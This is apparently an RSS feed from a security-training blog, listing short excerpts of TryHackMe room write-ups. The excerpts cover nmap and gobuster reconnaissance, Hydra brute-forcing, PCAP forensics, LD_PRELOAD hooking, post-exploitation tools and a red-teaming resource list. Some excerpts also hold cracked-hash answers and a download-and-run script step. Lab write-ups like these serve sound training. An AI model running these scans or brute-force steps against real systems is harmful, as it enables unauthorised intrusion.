Follow @anir0y Vulnerabilities 101 Vulnerabilities 101 [FREE ROOM] Vulnerabilities 101 Task 01: Introduction Cybersecurity is big business in the modern-day world. The hacks that we hear about in newspapers are from exploiting vulnerabilities. In this room, we&amp;rsquo;re going to explain exactly what a vulnerability is, the types of vulnerabilities and how we can exploit these for success in our penetration testing endeavours.</description><enclosure url="https://classroom.anir0y.in/img/Vulnerabilities101.png"/><link>https://classroom.anir0y.in/post/tryhackme-vulnerabilities101/</link></item><item><title>Try Hack Me Empline</title><pubDate>Sun, 19 Sep 2021 13:14:49 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/empline.png" width="700" height="420"/><description>OverView Follow @anir0y Empline Empline [Subscription Required] Empline Are you good enough to apply for this job?
Enumeration Nmap sudo nmap -sC -sV -oN nmap/init 10.10.127.35 [sudo] password for anir0y: Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-19 13:18 IST Nmap scan report for 10.10.127.35 Host is up (0.21s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA) | 256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA) |_ 256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519) 80/tcp open http Apache httpd 2.</description><enclosure url="https://classroom.anir0y.in/img/empline.png"/><link>https://classroom.anir0y.in/post/tryhackme-empline/</link></item><item><title>Install Openvas</title><pubDate>Mon, 13 Sep 2021 23:16:16 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/blog.png" width="700" height="420"/><description>{{post_content}}</description><enclosure url="https://classroom.anir0y.in/img/blog.png"/><link>https://classroom.anir0y.in/post/howto-install-openvas/</link></item><item><title>Try Hack Me The Cod Caper</title><pubDate>Mon, 13 Sep 2021 12:40:13 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/tcc.gif" width="700" height="420"/><description>OverView Follow @anir0y The Cod Caper The Cod Caper [FREE] The Cod Caper 1: Intro Hello there my name is Pingu. I&amp;rsquo;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&amp;rsquo;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server.</description><enclosure url="https://classroom.anir0y.in/img/tcc.gif"/><link>https://classroom.anir0y.in/post/tryhackme-thecodcaper/</link></item><item><title>TryHackMe Introduction to Django</title><pubDate>Sat, 11 Sep 2021 18:40:31 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in/img/Django.gif" width="700" height="420"/><description>OverView Follow @anir0y Django Room [Subscription Required] Django 01: Introduction Learning Python can be extremely useful for penetration testers, and a simple understanding of its frameworks can be a key to success. In this lesson, we are going to learn about one of the best ones ever made: Django.
Django is a high-level Python web framework that enables rapid development of secure and maintainable websites. It allows you to develop websites and web applications in a matter of hours.</description><enclosure url="https://classroom.anir0y.in/img/Django.gif"/><link>https://classroom.anir0y.in/post/tryhackme-django/</link></item><item><title>TryHackMe Principles of Security</title><pubDate>Thu, 09 Sep 2021 14:23:47 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Principles of Security Room [Free] Principles of Security Introduction The following room is going to outline some of the fundamental principles of information security. The frameworks used to protect data and systems to the elements of what exactly makes data secure.
The measures, frameworks and protocols discussed throughout this room all play a small part in &amp;ldquo;Defence in Depth.&amp;rdquo;
Defence in Depth is the use of multiple varied layers of security to an organisation&amp;rsquo;s systems and data in the hopes that multiple layers will provide redundancy in an organisation&amp;rsquo;s security perimeter.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-principlesofsecurity/</link></item><item><title>TryHackMe Wordpress CVE-2021-29447</title><pubDate>Sun, 29 Aug 2021 14:35:45 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Wordpress CVE-2021-29447 Room [Subscription Required] Wordpress CVE-2021-29447 Vulnerability allow a authenticated user whith low privilages upload a malicious WAV file that could lead to remote arbitrary file disclosure and server-side request forgery (SSRF).
Task 01: Introduction An XXE vulnerability consists of an injection that takes advantage of the poor configuration of the XML interpreter allowing to include external entities, this attack is performed against an application that interprets XML language in its parameters.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-wordpresscve202129447/</link></item><item><title>TryHackMe Intro to Windows</title><pubDate>Tue, 24 Aug 2021 15:17:46 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Intro to Windows Room [Subscription Required] Intro to Windows Task 01: Windows history On November 20, 1985 Microsoft announced its operating system named Windows which was a graphical operating system shell as a response to growing GUIs (graphical user interfaces). At the moment Windows dominates the word of computers with around 90% market share and it overtook Apple (Mac OS) which was introduced in 1984.
Windows versions:</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-intro2winold/</link></item><item><title>TryHackMe Bounty Hacker</title><pubDate>Fri, 20 Aug 2021 23:29:16 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Bounty Hacker Room [Subscription Required] Bounty Hacker You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they&amp;rsquo;d take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers &amp;amp; beef in your future!
Recon nmap sudo nmap -sC -sV -oN nmap/init 10.10.60.197 1 ⨯ [sudo] password for anir0y: Starting Nmap 7.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-cowboyhacker/</link></item><item><title>TryHackMe Hacking with PowerShell</title><pubDate>Tue, 17 Aug 2021 14:58:29 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Hacking with PowerShell Room [Subscription Required] Hacking with PowerShell Learn the basics of PowerShell and PowerShell Scripting
task 01: Objectives In this room, we&amp;rsquo;ll be exploring the following concepts:
What is Powershell and how it works Basic Powershell commands Windows enumeration with Powershell Powershell scripting Task 02: What is Powershell? Powershell is the Windows Scripting Language and shell environment that is built using the .NET framework.
This also allows Powershell to execute .</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-powershell/</link></item><item><title>TryHackMe Super-Spam</title><pubDate>Fri, 13 Aug 2021 09:04:14 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Super-Spam Room [Subscription Required] Super-Spam Task 01: Defeat Super-Spam General Uvilix Good Morning! Our intel tells us that he has returned. Super-spam, the evil alien villain from the planet Alpha Solaris IV from the outer reaches of the Andromeda Galaxy. He is a most wanted notorious cosmos hacker who has made it his lifetime mission to attack every Linux server possible on his journey to a Linux-free galaxy.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-superspamr/</link></item><item><title>TryHackMe Internal</title><pubDate>Tue, 10 Aug 2021 11:44:25 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y internal Room [Subscription Required] internalhttps://tryhackme.com/room/internal Task 01: Pre-engagement Briefing The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation:</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-internal/</link></item><item><title>TryHackMe Mobile Malware Analysis</title><pubDate>Thu, 05 Aug 2021 12:08:59 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Mobile Malware Analysis Room [FREE ROOM] Mobile Malware Analysis task 01: Introduction It&amp;rsquo;s incredible how often our computers are in the scope of cyber attacks. Antivirus has become an indispensable shield to provide us with a more secure environment, since we are exposed to destructible malware and cyber attacks. Inside our pockets, we have computers so powerful, but much smaller, we must be equally attentive on our phones, because we can suffer equally damaging attacks, sometimes even worse, because they can store relevant information such as private conversations and important accounts.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-mma/</link></item><item><title>TryHackMe Relevant</title><pubDate>Wed, 04 Aug 2021 08:35:47 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Relevant Room [Subscription Required] Relevant task 01: Pre-Engagement Briefing Scope of Work The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation:</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-relevant/</link></item><item><title>TryHackMe Linux Strength Training</title><pubDate>Tue, 03 Aug 2021 07:41:10 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Linux Strength Training Room [Subscription Required] Linux Strength Training Task 01: Intro This room is intended to further the understanding of basic Linux command line skills for beginners.
Task 02: Finding your way around linux - overview As a security researcher you will often be required to find specific files/folders on a system based on various conditions ranging from, but not limited to the following:
size filename user/group date modified date accessed Its keyword contents Therefore, we can do this using the following syntax:</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-linuxstrengthtraining/</link></item><item><title>TryHackMe Sweettooth Inc.</title><pubDate>Wed, 28 Jul 2021 12:16:24 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Sweettooth Inc Room [Subscription Required] Sweettooth Inc tools (additional) Docker CE Task 01: Deploy the machine Task 02:Enumeration Recon nmap (basic scan)
sudo nmap -sC -sV -oN nmap/init 10.10.187.112 [sudo] password for anir0y: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 12:20 IST Nmap scan report for 10.10.187.112 Host is up (0.19s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 41045/udp status | 100024 1 55132/udp6 status | 100024 1 55323/tcp status |_ 100024 1 56412/tcp6 status 2222/tcp open ssh OpenSSH 6.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-sweettoothinc/</link></item><item><title>Giveaway July 2021</title><pubDate>Mon, 26 Jul 2021 01:44:28 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView I am hosting a Giveaway 3 subscription (1 month) on July 27th, 2021, please share with your friends who might get benefits from this Follow @anir0y index by editor446</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/giveaway-1/</link></item><item><title>TryHackMe Agent Sudo</title><pubDate>Sat, 24 Jul 2021 16:50:32 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Follow @anir0y Agent Sudo Room [Subscription Required] Agent Sudo Task 01: Author note n/a
Task 02:Enumerate nmap
sudo nmap -sC -sV -oN init 10.10.245.114 Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-25 19:49 BST Nmap scan report for ip-10-10-245-114.eu-west-1.compute.internal (10.10.245.114) Host is up (0.020s latency). Not shown: 921 closed ports, 76 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-agentsudoctf/</link></item><item><title>TryHackMe Overpass 2 - Hacked</title><pubDate>Fri, 23 Jul 2021 01:16:55 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Overpass 2 room Overpass 2 Task 01: Forensics - Analyse the PCAP open Pcap with Wireshark 1.1 What was the URL of the page they used to upload a reverse shell?
wireshark filter http look for post req http.request.method == POST
1.2 What payload did the attacker use to gain access?
filter tcp.stream eq 1 read the tcp stream
1.3 What password did the attacker use to privesc?
filter tcp.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-overpass2hacked/</link></item><item><title>TryHackMe Baron Samedit</title><pubDate>Fri, 23 Jul 2021 00:56:23 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Baron Samedit room Baron Samedit Task 01: Deploy Task 02: Baron Samedit In January 2021, Qualys released a blog post detailing a terrifying new vulnerability in the Unix sudo program.
Specifically, this was a heap buffer overflow allowing any user to escalate privileges to root &amp;ndash; no misconfigurations required. This exploit works with the default settings, for any user regardless of sudo permissions, which makes it all the scarier. The vulnerability has been patched, but affects any unpatched version of the sudo program from 1.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-sudovulnssamedit/</link></item><item><title>TryHackMe Metamorphosis</title><pubDate>Wed, 21 Jul 2021 03:31:08 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Metamorphosis Room Recon nmap ```nmap sudo nmap -sC -sV -oN Metamorphosis 10.10.38.244 [sudo] password for anir0y: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 03:35 IST Nmap scan report for 10.10.38.244 Host is up (0.17s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA) | 256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA) |_ 256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519) 80/tcp open http Apache httpd 2.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-metamorphosis/</link></item><item><title>TryHackMe Crack the hash</title><pubDate>Tue, 20 Jul 2021 21:54:07 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Crack the hash I just used google search to find out the hashes! being lazy paid off this time!!!
Task 01 Hash Plain text Value 48bb6e862e54f2a795ffc4e541caed4d easy CBFDAC6008F9CAB4083784CBD1874F76618D2A97 password123 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032 letmein $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom bleh 279412f945939ba78ce0758d3fd83daa Eternity22 Task 02: Level 2 Hash Salt Plain text Value F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85 paule 1DFECA0C002AE40B8619ECF94819CC1B n63umy8lkf4i $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02. aReallyHardSalt waka99 e5d8870e5bdd26602cab8dbe07a942c8669e56d6 tryhackme 481616481616</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-crackthehash/</link></item><item><title>TryHackMe Simple CTF</title><pubDate>Mon, 19 Jul 2021 22:32:49 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Simple CTF room Simple CTF Task 01: Simple CTF How many services are running under port 1000? recon nmap
sudo nmap -p 0-999 10.10.38.103 -v -oN 1000-port Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-19 18:14 BST Initiating ARP Ping Scan at 18:14 Scanning 10.10.38.103 [1 port] Completed ARP Ping Scan at 18:14, 0.22s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 18:14 Completed Parallel DNS resolution of 1 host.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-easyctf/</link></item><item><title>TryHackMe RazorBlack</title><pubDate>Sun, 18 Jul 2021 19:31:05 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Overview RazorBlack Room Task 01 These guys call themselves hackers. Can you show them who&amp;rsquo;s the boss ??
Task 02: Flag Submission Panel What is the Domain Name? nmap
sudo nmap -sV -sC -oN nmap/init 10.10.149.120 # Nmap 7.91 scan initiated Sun Jul 18 19:35:34 2021 as: nmap -sV -sC -oN nmap/init 10.10.149.120 Nmap scan report for 10.10.149.120 Host is up (0.15s latency). Not shown: 986 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-18 14:05:57Z) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: .</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-raz0rblack/</link></item><item><title>TryHackMe Linux Function Hooking</title><pubDate>Sun, 18 Jul 2021 02:30:10 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>OverView Linux Function Hooking room task 01: Introduction In this room, we will be looking into what are Shared Libraries, what is Function Hooking and how we can leverage LD_PRELOAD to do the same! I have tried to keep this room as simple as possible, however some basic understanding of C will be definitely useful!
task 02: What are Shared Libraries? What Are Shared Libraries ?
Shared libraries are pre-compiled C-code which are linked during the final steps of producing an executable.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/</link></item><item><title>TryHackMe Ffuf</title><pubDate>Sat, 17 Jul 2021 02:49:02 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>overview fuff room Link task 01: Introduction Summary ffuf stands for Fuzz Faster U Fool. It&amp;rsquo;s a tool used for web enumeration, fuzzing, and directory brute forcing.
Install ffuf ffuf is already included in the following Linux distributions:
BlackArch Pentoo Kali Parrot Install SecLists SecLists is a collection of multiple types of lists used during security assessments. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-ffuf/</link></item><item><title>Try Hack Me Web Scanning</title><pubDate>Wed, 14 Jul 2021 14:00:45 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Overview Learn the basics of automated web scanning!
Web scanning represents one of the core constructs of modern pen testing. Quite simply, most of what we interact with on a daily basis is the internet, and therein there is a multitude of ever-widening number of vulnerabilities. Within this room, we will investigate two of the most common scanners: Nikto and Zap.
Web Scanning Solved by @anir0y Task 01: Pull the lever, Kronk Task 02: &amp;hellip;I&amp;rsquo;m supposed to scan with that?</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-rpwebscanning/</link></item><item><title>Awesome Red Teaming</title><pubDate>Tue, 13 Jul 2021 14:37:01 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Awesome Red Teaming List of Awesome Red Team / Red Teaming Resources
This list is for anyone wishing to learn about Red Teaming but do not have a starting point.
Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on Mitre ATT&amp;amp;CK
You can help by sending Pull Requests to add more information.
Table of Contents Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Exfiltration Command and Control Embedded and Peripheral Devices Hacking Misc RedTeam Gadgets Ebooks Training Certification ↑ Initial Access The Hitchhiker’s Guide To Initial Access How To: Empire’s Cross Platform Office Macro Phishing with PowerPoint PHISHING WITH EMPIRE Bash Bunny OWASP Presentation of Social Engineering - OWASP USB Drop Attacks: The Danger of “Lost And Found” Thumb Drives Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 24 Cobalt Strike - Spear Phishing documentation Cobalt Strike Blog - What&amp;rsquo;s the go-to phishing technique or exploit?</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/post-awesome-red-teaming/</link></item><item><title>TryHackMe The find command</title><pubDate>Mon, 12 Jul 2021 23:17:35 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Overview The find command Solved by @anir0y Task 01: Start finding Task 02: Be more specific Most of the time, you won’t be looking for something in your working directory. The first argument of your find command should be the directory you want to search. The command will search in that directory and in all its subdirectories. So, if you want to search the whole filesystem, your command should begin with find /.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-thefindcommand/</link></item><item><title>TryHackMe Tmux</title><pubDate>Sun, 11 Jul 2021 13:50:48 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Overview Room Name tmux Dev @anir0y [Task 1] Screens wishes it was cool tmux, the terminal multiplexer, is easily one of the most used tools by the Linux community (and not just pentesters!). While not a malicious tool, tmux makes running simultaneous tasks throughout a pentest incredibly easy. In this primer room, we&amp;rsquo;ll walk through the process of installing and using some of the most common key combinations used in tmux.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-rptmux/</link></item><item><title>TryHackMe Crisis</title><pubDate>Sat, 10 Jul 2021 15:18:30 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Overview Room Name Crisis Dev @anir0y Tools required Wireshark Join Room Crisis Task 01: Introduction Download the File open with Wireshark 1.1 Download file.
1.2 When it all started?
Open packet 1, layer 1 reavels the Time Stamp
Enter Format (MMM DD, YYYY)
1.3 What is the domain name?
Check the DNS (use filer DNS)
1.4 What is the EMAIL Sending Protocol &amp;amp; Port
RFC 8314; hint wiki
use the protocol name/port filer to find ans.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-crisis/</link></item><item><title>TryHackMe Couch</title><pubDate>Fri, 09 Jul 2021 19:22:00 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Couch Flags Task Remarks 1.1 flag Recon running nmap: (Default)
┌──(anir0y㉿kali)-[~/share/thm/room/couch] └─$ sudo nmap -sC -sV -oN nmap/couch 10.10.94.40 [sudo] password for anir0y: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 19:26 IST Nmap scan report for 10.10.94.40 Host is up (0.21s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA) | 256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA) |_ 256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-couch/</link></item><item><title>TryHackMe Inclusion</title><pubDate>Thu, 08 Jul 2021 14:19:01 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>inclusion task 01: Deploy This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability.
Task 02: Root It Recon Nmap nmap found two open TCP ports, SSH (22) and HTTP (80):
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-08 14:35 IST Nmap scan report for 10.10.206.247 Host is up (0.27s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-inclusion/</link></item><item><title>TryHackMe RootMe</title><pubDate>Tue, 06 Jul 2021 13:36:08 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>RootMe Task 01: Deploy the Room Task 02: Reconnaissance 2.1 Scan the machine, how many ports are open?
run the command: nmap -sC -sV -oN nmap MACHINE_IP
2.2 What version of Apache is running?
Ans is in task 2.1 output result. use cat nmap to see the output file.
2.3 Find directories on the web server using the GoBuster tool.
gobuster dir -u 10.10.71.82 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
2.4 What is the hidden directory?</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-rrootme/</link></item><item><title>TryHackMe Gitandcrumpets</title><pubDate>Sun, 04 Jul 2021 23:04:02 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Git and Crumpets Our devs have been clamoring for some centralized version control, so the admin came through. Rumour has it that they included a few countermeasures&amp;hellip;
Task 01: Start the VM Task 02: Git the flags user I tried running nmap, no luck
being impatatient, I ran a quick curl commnad curl -s 10.10.x.y to see what&amp;rsquo;s up.
got this output.
let&amp;rsquo;s setup DNS record, edit /etc/hosts file.
cat /etc/hosts 10.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-gitandcrumpets/</link></item><item><title>TryHackMe Postexploit</title><pubDate>Sun, 04 Jul 2021 14:36:48 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Post-Exploitation Basics Learn the basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom
Task 01: Introduction This room will be related to very real world applications and will most likely not help with any ctfs however this room will give you great starting knowledge of how to approach a network after you have gained a shell on a machine.
Task 02: Enumeration w/ Powerview Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-postexploit/</link></item><item><title>TryHackMe Hydra</title><pubDate>Sat, 03 Jul 2021 20:14:32 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>Hydra Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website&amp;rsquo;s credentials.
Task 01: Hydra Introduction Hydra is a brute force online password cracking program; a quick system login password &amp;lsquo;hacking&amp;rsquo; tool.
Installing Hydra If you&amp;rsquo;re using Kali Linux, hydra is pre-installed. Otherwise you can download it here: https://github.com/vanhauser-thc/thc-hydra
Task 02: Using Hydra Hydra Commands The options we pass into Hydra depends on which service (protocol) we&amp;rsquo;re attacking.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/tryhackme-hydra/</link></item><item><title>python pip2 Install</title><pubDate>Sat, 03 Jul 2021 01:30:12 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>PIP 2 installation in last few weeks I&amp;rsquo;ve seen people are asking for how to install pip2 in latest Kali linux, here is the answer. once installation is done, you can find it as pip2 and then you can use it to install pip2 i.e. python 2.7 modules.
how to? download the script and run here is how:
wget https://gist.githubusercontent.com/anir0y/a20246e26dcb2ebf1b44a0e1d989f5d1/raw/a9908e5dd147f0b6eb71ec51f9845fafe7fb8a7f/pip2%2520install -O run.sh chmod +x run.sh #wget will save the output as run.</description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/pip2-install/</link></item><item><title>TryHackMe Room Ice</title><pubDate>Tue, 29 Jun 2021 14:11:50 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>ICE Deploy &amp;amp; hack into a Windows machine, exploiting a very poorly secured media server.
task 01: Connect Nothing to do just follow the instructions.
Task 02: Recon Things you should know https://nmap.org/book/synscan.html https://nmap.org/book/man-port-scanning-techniques.html for this lab: nmap -sS -p- TARGET_IP
task 2.1 Deploy the machine! This may take up to three minutes to start.
